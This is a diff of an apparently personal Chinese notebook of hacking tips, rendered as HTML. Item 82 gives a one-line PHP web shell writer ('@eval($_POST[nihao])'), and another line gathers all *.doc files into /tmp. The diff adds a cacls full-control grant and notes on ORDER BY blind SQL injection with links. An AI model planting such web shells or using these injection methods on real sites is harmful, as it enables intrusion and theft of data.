@@ -1110,6 +1110,7 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
 80.</span>http://www.tuicool.com/articles/zIJrEjn GitHub上README写法暨markdown语法解读
 <span class="p">
 81.</span>windows下cacls查看权限和设置权限http://41080138.blog.51cto.com/2587513/951403
+    cacls h:/temp /t /e /c /g wzj9999:f
 <span class="p">
 82.</span>php写shell: cmd=fputs(fopen('chk.php','w'),'<span class="cp">&lt;?php @eval($_POST[nihao]); ?&gt;</span>');
    其中nihao的位置不能有''或"",而且fputs的第二个参数只能用单引号包住
@@ -3296,6 +3297,13 @@ $_POST<span class="p">[</span><span class="nv">b</span><span class="p">]</span>=
 <span class="p">
 275.</span>ios一键新机搜索cydia插件361一键新机
     http://cydia.saurik.com/package/cn.tinyapps.rst/
+<span class="p">
+276.</span>order by类型sql注入
+    order by后面可以加字段名,表达式和字段的位置,字段的位置需要是整数型.order by 后面不可以跟union
+    order by注入跟where条件注入具有同样的布尔盲注和时间注入的方式
+    http://vinc.top/2016/06/20/mysql-order-by-后注入/
+    https://www.secpulse.com/archives/57197.html
+    http://www.freebuf.com/articles/web/155876.html
 </code></pre>
 </div>
 </span>
